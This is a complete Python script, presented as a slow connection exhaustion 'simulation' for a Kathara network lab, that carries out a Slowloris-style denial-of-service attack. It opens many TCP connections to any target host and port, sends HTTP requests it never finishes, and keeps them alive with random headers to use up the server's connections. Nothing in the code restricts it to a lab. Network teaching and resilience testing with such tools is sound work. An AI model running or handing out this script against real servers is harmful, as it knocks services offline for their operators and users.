#!/usr/bin/env python3
import socket
import time
import argparse
import threading
import random


def create_slow_socket(target_host, target_port, timeout=4):
    """
    Opens a TCP connection and sends an incomplete HTTP request.
    The connection remains open.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)

    s.connect((target_host, target_port))

    # Intentionally incomplete HTTP request: the final double CRLF is not sent.
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"User-Agent: kathara-slow-test\r\n"
        f"Accept-language: en-US,en,q=0.5\r\n"
    )

    s.sendall(request.encode())

    return s


def keep_socket_alive(sock, target_host):
    """
    Periodically sends small dummy headers to keep the server from closing the
    connection due to inactivity.
    """
    header = f"X-Keep-Alive-{random.randint(1, 999999)}: {random.randint(1, 999999)}\r\n"
    sock.sendall(header.encode())


def slow_attack(target_host, target_port, connections, interval, duration):
    sockets = []
    start_time = time.time()

    print(f"[+] Target: {target_host}:{target_port}")
    print(f"[+] Requested connections: {connections}")
    print(f"[+] Keep-alive interval: {interval} seconds")
    print(f"[+] Duration: {duration} seconds")
    print("[+] Starting slow connection exhaustion simulation")

    # Phase 1: open connections.
    for i in range(connections):
        try:
            s = create_slow_socket(target_host, target_port)
            sockets.append(s)
            print(f"[+] Connection opened: {i + 1}/{connections}")
        except Exception as e:
            print(f"[-] Connection failed {i + 1}/{connections}: {e}")

        # Small pause to avoid overly aggressive bursts.
        time.sleep(0.05)

    print(f"[+] Connections actually opened: {len(sockets)}")

    # Phase 2: maintain connections.
    while time.time() - start_time < duration:
        alive_sockets = []

        for s in sockets:
            try:
                keep_socket_alive(s, target_host)
                alive_sockets.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass

        sockets = alive_sockets

        print(f"[*] Connections still active: {len(sockets)}")

        # Recreate connections if too many have been dropped.
        missing = connections - len(sockets)

        for _ in range(missing):
            try:
                s = create_slow_socket(target_host, target_port)
                sockets.append(s)
            except Exception:
                pass

        time.sleep(interval)

    # Phase 3: orderly shutdown.
    print("[+] Simulation complete. Closing sockets.")

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    print("[+] Complete.")


def main():
    parser = argparse.ArgumentParser(
        description="Controlled slow connection exhaustion simulation for a Kathara lab"
    )

    parser.add_argument("target_host", help="Target server IP address or hostname")
    parser.add_argument("target_port", type=int, help="HTTP/TCP service port")
    parser.add_argument("-c", "--connections", type=int, default=100, help="Number of simultaneous connections")
    parser.add_argument("-i", "--interval", type=int, default=10, help="Keep-alive interval in seconds")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Total attack duration in seconds")

    args = parser.parse_args()

    slow_attack(
        target_host=args.target_host,
        target_port=args.target_port,
        connections=args.connections,
        interval=args.interval,
        duration=args.duration
    )


if __name__ == "__main__":
    main()
